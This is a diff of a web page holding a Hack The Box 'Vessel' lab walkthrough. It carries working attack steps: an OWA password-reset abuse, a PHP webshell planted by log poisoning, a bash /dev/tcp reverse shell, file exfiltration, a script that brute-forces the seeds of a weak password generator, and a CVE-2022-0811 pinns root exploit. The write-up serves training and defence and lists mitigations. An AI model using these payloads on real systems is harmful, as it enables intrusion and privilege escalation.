@@ -119,8 +118,8 @@ curl cache → base64 decode → deserialize → extract temp_passkey
 <pre><code class="language-bash" data-language="bash">curl -s -i -X POST "http://openwebanalytics.vessel.htb/index.php" \
   -d "owa_action=base.usersChangePassword&amp;owa_k=&lt;temp_passkey&gt;&amp;owa_password=hacked123&amp;owa_password2=hacked123"
 </code></pre>
-<p><strong>Why this works:</strong> The <code>base.usersChangePassword</code> action only checks that the supplied <code>owa_k</code> token matches a <code>temp_passkey</code> in the database. It doesn't verify email ownership, session state, or any other factor. If the token matches, the password is REDACTED This is the authentication flaw — we obtained the token from a publicly readable cache file.</p>
-<p><strong>Result:</strong> HTTP 302 with <code>status_code=3006</code> = success. Admin password is REDACTED <code>hacked123</code>.</p>
+<p><strong>Mechanism:</strong> The <code>base.usersChangePassword</code> action only checks that the supplied <code>owa_k</code> token matches a <code>temp_passkey</code> in the database. It doesn't verify email ownership, session state, or any other factor. If the token matches, the password is changed. This is the authentication flaw - we obtained the token from a publicly readable cache file.</p>
+<p><strong>Result:</strong> HTTP 302 with <code>status_code=3006</code> = success. Admin password is now <code>REDACTED</code>.</p>
 <h3 id="step-14-log-in-and-get-rce">Step 14: Log in and Get RCE</h3>
 <pre><code class="language-python" data-language="python"># 1. Login as admin
 # 2. Get nonce from settings page
@@ -131,7 +130,7 @@ POST owa_config[base.error_log_file]=/var/www/html/owa/owa-data/logs/shell.php
 # 4. Write PHP webshell into the log (mass assignment with fake config key)
 POST owa_config[base.pwn]=&lt;?php system($_REQUEST['cmd']); ?&gt;
 </code></pre>
-<p><strong>Why mass assignment works:</strong> OWA's <code>base.optionsUpdate</code> action loops over all <code>owa_config[*]</code> parameters and saves them to the configuration. There's no whitelist. So we can set internal config values that aren't exposed in the UI — including <code>error_log_file</code> (where OWA writes its debug log) and <code>error_log_level</code> (setting it to 2 makes OWA log all POST parameters).</p>
+<p><strong>Why mass assignment works:</strong> OWA's <code>base.optionsUpdate</code> action loops over all <code>owa_config[*]</code> parameters and saves them to the configuration. There's no whitelist. So we can set internal config values that aren't exposed in the UI - including <code>error_log_file</code> (where OWA writes its debug log) and <code>error_log_level</code> (setting it to 2 makes OWA log all POST parameters).</p>
 <p><strong>Why the log becomes executable PHP:</strong> We changed the log file path to end in <code>.php</code>. Apache will execute any <code>.php</code> file as PHP. When OWA logs our POST parameters (including <code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code>), that PHP code lands in a <code>.php</code> file in a web-accessible directory. Visiting that file executes it.</p>
 <h3 id="step-15-reverse-shell">Step 15: Reverse Shell</h3>
 <pre><code class="language-bash" data-language="bash">curl "http://openwebanalytics.vessel.htb/owa-data/logs/shell.php" \
@@ -139,19 +138,19 @@ POST owa_config[base.pwn]=&lt;?php system($_REQUEST['cmd']); ?&gt;
 </code></pre>
 <p><strong>Why bash reverse shell:</strong> We want an interactive shell, not just command output. A reverse shell has the target connect back to us (bypassing inbound firewall rules). <code>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code> redirects stdin/stdout/stderr over a TCP connection.</p>
 <p><strong>Result:</strong> Shell as <code>www-data</code>.</p>
-<hr />
-<h2 id="stage-5-lateral-movement-to-ethan">Stage 5 — Lateral Movement to Ethan</h2>
+<hr>
+<h2 id="stage-5-lateral-movement-to-ethan">Stage 5: Lateral Movement to Ethan</h2>
 <h3 id="step-16-enumerate-the-filesystem">Step 16: Enumerate the Filesystem</h3>
 <pre><code class="language-bash" data-language="bash">ls -la /home/steven/
 ls -la /home/steven/.notes/
 </code></pre>
 <p><strong>Why:</strong> After getting a shell, the first thing you do is enumerate home directories. Files left by developers often contain credentials, keys, or tools. We find:</p>
 <ul>
-<li><code>passwordGenerator</code> — a Windows PE32 executable (34MB)</li>
-<li><code>.notes/notes.pdf</code> — a password-protected PDF</li>
-<li><code>.notes/screenshot.png</code> — a screenshot of the password generator UI</li>
+<li><code>passwordGenerator</code> : a Windows PE32 executable (34MB)</li>
+<li><code>.notes/notes.pdf</code> : a password-protected PDF</li>
+<li><code>.notes/screenshot.png</code> : a screenshot of the password generator UI</li>
 </ul>
-<p><strong>Hacker mindset:</strong> The screenshot shows a GUI app generating 32-character passwords with "All Characters" selected. The PDF is locked with a password. The password was probably generated by this app. If we can reverse the app and reproduce its output, we can crack the PDF.</p>
+<p> The screenshot shows a GUI app generating 32-character passwords with "All Characters" selected. The PDF is locked with a password. The password was probably generated by this app. If we can reverse the app and reproduce its output, we can crack the PDF.</p>
 <h3 id="step-17-exfiltrate-files">Step 17: Exfiltrate Files</h3>
 <pre><code class="language-bash" data-language="bash"># On target:
 cp /home/steven/passwordGenerator /var/www/html/owa/owa-data/logs/pg
@@ -172,23 +171,23 @@ wget http://openwebanalytics.vessel.htb/owa-data/logs/ss.png
 </ol>
 <p>The key function:</p>
 <pre><code class="language-python" data-language="python">def genPassword(self):
-    charset = '[redacted encoded lab material]~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'
+    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'
     qsrand(QTime.currentTime().msec())  # &lt;-- seed is milliseconds!
-    password = REDACTED
+    password = ''
     for i in range(32):
         idx = qrand() % len(charset)
         password += charset[idx]
     return password
 </code></pre>
-<p><strong>The vulnerability:</strong> <code>QTime.currentTime().msec()</code> returns the current millisecond (0–999). There are only <strong>1000 possible seeds</strong>. This means there are only <strong>1000 possible passwords</strong> the app can generate, regardless of how "random" they look.</p>
+<p><strong>The vulnerability:</strong> <code>QTime.currentTime().msec()</code> returns the current millisecond (0-999). There are only <strong>1000 possible seeds</strong>. This means there are only <strong>1000 possible passwords</strong> the app can generate, regardless of how "random" they look.</p>
 <h3 id="step-19-generate-the-password-wordlist">Step 19: Generate the Password Wordlist</h3>
-<p><strong>Critical insight — platform difference:</strong> The <code>passwordGenerator.exe</code> is a Windows binary. Qt's <code>qrand()</code> on Windows wraps the MSVC C runtime's <code>rand()</code>, which uses a simple LCG (Linear Congruential Generator):</p>
+<p><strong>Critical insight - platform difference:</strong> The <code>passwordGenerator.exe</code> is a Windows binary. Qt's <code>qrand()</code> on Windows wraps the MSVC C runtime's <code>rand()</code>, which uses a simple LCG (Linear Congruential Generator):</p>
 <pre><code>state = (state * 214013 + 2531011) &amp; 0xFFFFFFFF
 return (state &gt;&gt; 16) &amp; 0x7FFF   # RAND_MAX = 32767 on Windows
 </code></pre>
 <p>Linux's <code>glibc</code> uses a completely different (more complex) RNG. Using Linux's <code>rand()</code> via ctypes would generate <strong>wrong passwords</strong>. We must replicate the Windows MSVC algorithm exactly.</p>
 <pre><code class="language-python" data-language="python">import ctypes
-charset = '[redacted encoded lab material]~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'
+charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'
 
 def msvc_srand(seed):
     global state
@@ -201,7 +200,7 @@ def msvc_rand():
 
 for seed in range(1000):
     msvc_srand(seed)
-    pwd = REDACTED % len(charset)] for _ in range(32))
+    pwd = ''.join(charset[msvc_rand() % len(charset)] for _ in range(32))
     passwords.add(pwd)
 </code></pre>
 <p>This generates 1000 unique passwords covering every possible output of the generator.</p>
@@ -215,26 +214,26 @@ for seed in range(1000):
 </code></pre>
 <p><strong>Content:</strong></p>
 <blockquote>
-<p>Dear Steven, here is my password: null
-— Ethan</p>
+<p>Dear Steven, here is my password: <code>REDACTED</code>
+- Ethan</p>
 </blockquote>
-<p><strong>Hacker mindset:</strong> People reuse passwords between systems. Ethan wrote his system password in a note to Steven. This is credential exposure through negligent documentation — a very common real-world finding.</p>
+<p> People reuse passwords between systems. Ethan wrote his system password in a note to Steven. This is credential exposure through negligent documentation - a very common real-world finding.</p>
 <h3 id="step-22-ssh-as-ethan-user-flag">Step 22: SSH as Ethan + User Flag</h3>
-<pre><code class="language-bash" data-language="bash">ssh ethan@10.129.227.225  # password: null
+<pre><code class="language-bash" data-language="bash">ssh ethan@10.129.227.225  # password: REDACTED
 cat ~/user.txt
 </code></pre>
-<hr />
-<h2 id="stage-6-privilege-escalation-to-root-cve-2022-0811">Stage 6 — Privilege Escalation to Root (CVE-2022-0811)</h2>
+<hr>
+<h2 id="stage-6-privilege-escalation-to-root-cve-2022-0811">Stage 6: Privilege Escalation to Root (CVE-2022-0811)</h2>
 <h3 id="step-23-identify-the-attack-vector">Step 23: Identify the Attack Vector</h3>
 <pre><code class="language-bash" data-language="bash">ls -la /usr/bin/pinns
 find / -name runc 2&gt;/dev/null
 </code></pre>
 <p><strong>Result:</strong></p>
 <ul>
-<li><code>/usr/bin/pinns</code> — SUID binary owned by root, executable by group <code>ethan</code></li>
-<li><code>/usr/sbin/runc</code> — container runtime present</li>
+<li><code>/usr/bin/pinns</code> : SUID binary owned by root, executable by group <code>ethan</code></li>
+<li><code>/usr/sbin/runc</code> : container runtime present</li>
 </ul>
-<p><strong>What is pinns?</strong> <code>pinns</code> is a utility from <strong>CRI-O</strong> (a container runtime for Kubernetes). Its job is to "pin" Linux namespaces — create new namespaces and bind them to files so they persist after all processes in them exit. It also accepts a <code>-s</code> flag to set <strong>sysctl kernel parameters</strong> within those namespaces.</p>
+<p><strong>What is pinns?</strong> <code>pinns</code> is a utility from <strong>CRI-O</strong> (a container runtime for Kubernetes). Its job is to "pin" Linux namespaces - create new namespaces and bind them to files so they persist after all processes in them exit. It also accepts a <code>-s</code> flag to set <strong>sysctl kernel parameters</strong> within those namespaces.</p>
 <p><strong>CVE-2022-0811:</strong> Because <code>pinns</code> is SUID root, it runs as root. The <code>-s</code> parameter lets it set <strong>any sysctl</strong>, including <code>kernel.core_pattern</code>. On Linux, <code>kernel.core_pattern</code> defines what happens when a process crashes (core dump). If it starts with <code>|</code>, the kernel pipes the core dump to that program <strong>as root</strong>.</p>
 <h3 id="step-24-understanding-the-full-exploit-chain">Step 24: Understanding the Full Exploit Chain</h3>
 <p>The exploit requires two simultaneous actions:</p>
@@ -272,19 +271,19 @@ chmod +x /home/ethan/e.sh
 </code></pre>
 <p><strong>Breaking down the parameters:</strong></p>
 <ul>
-<li><code>-d /var/run</code> — directory to store namespace pin files</li>
-<li><code>-f &lt;uuid&gt;</code> — filename for the namespace pin files (any valid UUID)</li>
-<li><code>-s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/home/ethan/e.sh #'</code> — sysctls to set. The <code>+</code> separates multiple sysctls. <code>kernel.core_pattern=|/home/ethan/e.sh #</code> sets the core dump handler to our script. The <code>#</code> at the end is a comment character that prevents any appended arguments from breaking the command.</li>
-<li><code>--ipc --net --uts --cgroup</code> — namespace types to create/pin</li>
+<li><code>-d /var/run</code> : directory to store namespace pin files</li>
+<li><code>-f &lt;uuid&gt;</code> : filename for the namespace pin files (any valid UUID)</li>
+<li><code>-s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/home/ethan/e.sh #'</code> : sysctls to set. The <code>+</code> separates multiple sysctls. <code>kernel.core_pattern=|/home/ethan/e.sh #</code> sets the core dump handler to our script. The <code>#</code> at the end is a comment character that prevents any appended arguments from breaking the command.</li>
+<li><code>--ipc --net --uts --cgroup</code> : namespace types to create/pin</li>
 </ul>
-<p><strong>Why this runs as root:</strong> <code>pinns</code> has the SUID bit set and is owned by root. When ethan runs it, the effective UID becomes root, and the sysctl write happens with root privileges. This is the exploit — a normal user can set <code>kernel.core_pattern</code> to an arbitrary path.</p>
+<p><strong>Why this runs as root:</strong> <code>pinns</code> has the SUID bit set and is owned by root. When ethan runs it, the effective UID becomes root, and the sysctl write happens with root privileges. This is the exploit - a normal user can set <code>kernel.core_pattern</code> to an arbitrary path.</p>
 <h3 id="step-28-trigger-core-dump-session-1-inside-container">Step 28: Trigger Core Dump (Session 1, inside container)</h3>
 <pre><code class="language-bash" data-language="bash">ulimit -c unlimited    # enable core dumps
 tail -f /dev/null &amp;    # background process to kill
 kill -SIGSEGV %1       # send segfault signal → triggers core dump
 </code></pre>
-<p><strong>Why SIGSEGV:</strong> A segmentation fault (SIGSEGV) is one of the signals that triggers a core dump. When the process crashes, the kernel executes <code>kernel.core_pattern</code> — which is now our payload script — <strong>as root</strong>.</p>
-<p>The payload runs: <code>chmod +s /usr/bin/bash</code> — setting the SUID bit.</p>
+<p><strong>Why SIGSEGV:</strong> A segmentation fault (SIGSEGV) is one of the signals that triggers a core dump. When the process crashes, the kernel executes <code>kernel.core_pattern</code> - which is now our payload script - <strong>as root</strong>.</p>
+<p>The payload runs: <code>chmod +s /usr/bin/bash</code> - setting the SUID bit.</p>
 <h3 id="step-29-root-shell">Step 29: Root Shell</h3>
 <pre><code class="language-bash" data-language="bash"># Session 2:
 ls -la /usr/bin/bash    # verify -rwsr-sr-x (SUID bit set)
@@ -292,7 +291,7 @@ bash -p                 # -p preserves effective UID (root)
 cat /root/root.txt
 </code></pre>
 <p><strong>Why <code>bash -p</code>:</strong> By default, bash drops privileges when it detects it's being run with an effective UID different from the real UID (a security feature). The <code>-p</code> flag disables this behavior, keeping the root effective UID.</p>
-<hr />
+<hr>
 <h2 id="summary-of-the-full-chain">Summary of the Full Chain</h2>
 <pre><code>Port 80 (HTTP)
     └── /dev/.git exposed
@@ -348,10 +347,9 @@ cat /root/root.txt
 <td>Patch software promptly</td>
 <td>OWA 1.7.3 → 1.7.4 critical security fix</td>
 </tr>
-</tbody></table>
-e:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$13"}}]
+</tbody></table>e:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$13"}}]
 f:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-vault-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Vault Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-wall-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Wall Walkthrough"}]]}]}]]}]
 10:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
-14:T516,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-vessel-walkthrough/#article","headline":"Hack The Box: Vessel Walkthrough","description":"An archived walkthrough of the retired Hack The Box Vessel machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-vessel-walkthrough/","datePublished":"2026-06-09T11:01:30.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2883,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/094bffd3afde14eb46aecc95d73f343333668a9e/HTB-Vessel.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-vessel-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-vessel-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Vessel Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-vessel-walkthrough/"}]}]}11:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
+14:T597,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-vessel-walkthrough/#article","headline":"Hack The Box: Vessel Walkthrough","description":"An exposed Git repository led to a mysqljs type-confusion login bypass, an Open Web Analytics reset-token leak and log poisoning gave a shell, and a predictable password generator unlocked Ethan before the setuid pinns core-pattern flaw created a root shell.","url":"https://cyberkareem.com/writing/hackthebox-vessel-walkthrough/","datePublished":"2026-06-09T11:01:30.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2813,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/094bffd3afde14eb46aecc95d73f343333668a9e/HTB-Vessel.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-vessel-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-vessel-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Vessel Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-vessel-walkthrough/"}]}]}11:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
 12:["$","$L15",null,{"children":["$","$16",null,{"name":"Next.MetadataOutlet","children":"$@17"}]}]
 17:null
